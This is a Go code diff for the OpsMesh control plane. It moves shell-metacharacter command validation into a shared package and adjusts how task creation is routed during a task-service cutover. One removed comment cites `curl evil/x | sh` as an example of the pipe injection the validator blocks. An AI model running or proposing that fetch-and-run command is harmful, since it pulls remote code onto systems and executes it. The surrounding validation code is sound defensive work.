@@ -7,8 +7,6 @@ package controlplane
 
 import (
 	"context"
-	"errors"
-	"fmt"
 	"io"
 	"net/http"
 	"strconv"
@@ -16,12 +14,14 @@ import (
 	"time"
 
 	"github.com/Levango7/OpsMesh/internal/controlplane/auditsafe"
+	grpcserver "github.com/Levango7/OpsMesh/internal/controlplane/grpc"
 	"github.com/Levango7/OpsMesh/internal/controlplane/paginate"
 
 	"github.com/Levango7/OpsMesh/internal/domain"
 	"github.com/Levango7/OpsMesh/internal/events"
 	"github.com/Levango7/OpsMesh/internal/logx"
 	"github.com/Levango7/OpsMesh/internal/proto"
+	"github.com/Levango7/OpsMesh/internal/taskvalidate"
 )
 
 // sanitizeAuditDetail 是 auditsafe.Detail 的薄包装（TD-87 批 2 第三批：实现已抽到
@@ -29,9 +29,11 @@ import (
 // 属「共享内核藏在业务文件里」；父包 30 处调用点零改动）。
 func sanitizeAuditDetail(s string) string { return auditsafe.Detail(s) }
 
-// maxCommandLen 控制面侧命令长度上限（安全加固纵深防御）。
-// 超过此长度的命令几乎不可能是合法运维操作，更可能是注入载荷或二进制 blob。
-const maxCommandLen = 4096
+// hasExternalTaskService 统一任务队列归属：本机地址使用本地 HTTP/store + 内嵌 agent RPC；
+// 只有真正独立的 task-svc 才允许 HTTP 代理与“新任务归对侧”门生效。
+func (s *Server) hasExternalTaskService() bool {
+	return !grpcserver.ShouldEmbedTaskService(s.cfg)
+}
 
 // validateCommand 控制面侧命令内容校验（安全加固纵深防御）。
 // 与 agent 端 checkShellMetachars 保持一致的元字符拦截策略，在控制面侧提前拦截，
@@ -56,42 +58,7 @@ const maxCommandLen = 4096
 // 注意：这是纵深防御的第一道闸（控制面侧），不替代 agent 端 checkShellMetachars。
 // 两端均拦截可降低单点绕过风险：控制面被攻陷时 agent 端兜底，agent 端有 bug 时控制面侧兜底。
 func validateCommand(command string) error {
-	if command == "" {
-		return errors.New("command is empty")
-	}
-	if len(command) > maxCommandLen {
-		return fmt.Errorf("command too long (max %d bytes, got %d)", maxCommandLen, len(command))
-	}
-	// 与 agent 端 checkShellMetachars 一致的元字符拦截。
-	if strings.Contains(command, "\n") {
-		return errors.New("command contains newline metacharacter ('\\n'): rejected")
-	}
-	if strings.Contains(command, "\r") {
-		return errors.New("command contains carriage return metacharacter ('\\r'): rejected")
-	}
-	if strings.Contains(command, ";") {
-		return errors.New("command contains command separator metacharacter (';'): rejected")
-	}
-	if strings.Contains(command, "$(") {
-		return errors.New("command contains command substitution metacharacter ('$()'): rejected")
-	}
-	if strings.Contains(command, "`") {
-		return errors.New("command contains backtick metacharacter: rejected")
-	}
-	// 安全加固：拦截管道符 |，防 `curl evil/x | sh` 这类管道注入。
-	// 原实现暂不拦截管道符，导致管道注入载荷可过校验；现已默认拦截。
-	if strings.Contains(command, "|") {
-		return errors.New("command contains pipe metacharacter ('|'): rejected")
-	}
-	// 检测单个 &（后台执行），允许合法模式 &&、>&、&>（与 agent 端逻辑一致）。
-	cmd := command
-	cmd = strings.ReplaceAll(cmd, ">&", "")
-	cmd = strings.ReplaceAll(cmd, "&>", "")
-	cmd = strings.ReplaceAll(cmd, "&&", "")
-	if strings.Contains(cmd, "&") {
-		return errors.New("command contains background operator metacharacter ('&'): rejected")
-	}
-	return nil
+	return taskvalidate.ValidateCommand(command)
 }
 
 // handleCreateTask 处理 POST /api/v1/tasks：内部下发入口。
@@ -119,7 +86,7 @@ func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 	// 一侧，agent 从对侧拉不到、状态也查不着，且**无任何报错**。
 	// 故明确拒绝并指引去该侧，而不是静默建在本地。判据与 auth 域
 	// auth_users.go 的 OwnsNewAccounts 完全同构（见 cutover.Router.RouteTaskCreate）。
-	if s.cutoverRouter != nil && s.cutoverRouter.RouteTaskCreate() {
+	if s.hasExternalTaskService() && s.cutoverRouter != nil && s.cutoverRouter.RouteTaskCreate() {
 		paginate.WriteJSON(w, http.StatusConflict, map[string]string{
 			"error": "new tasks are owned by task-svc (TASK_SVC_OWNS_NEW_TASKS=true); create it on the task-svc side",
 		})
@@ -479,7 +446,7 @@ func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) 
 	// 切流（TD-60 方案 C）：与 handleCreateTask 同判据——TASK_SVC_OWNS_NEW_TASKS
 	// 为 true 且 task 总闸开启时，批量下发同样拒绝本地建号并指引去 task-svc 侧。
 	// 批量下发的**影响面比单建更大**，更不该静默建在被切走的一侧。
-	if s.cutoverRouter != nil && s.cutoverRouter.RouteTaskCreate() {
+	if s.hasExternalTaskService() && s.cutoverRouter != nil && s.cutoverRouter.RouteTaskCreate() {
 		paginate.WriteJSON(w, http.StatusConflict, map[string]string{
 			"error": "new tasks are owned by task-svc (TASK_SVC_OWNS_NEW_TASKS=true); create it on the task-svc side",
 		})
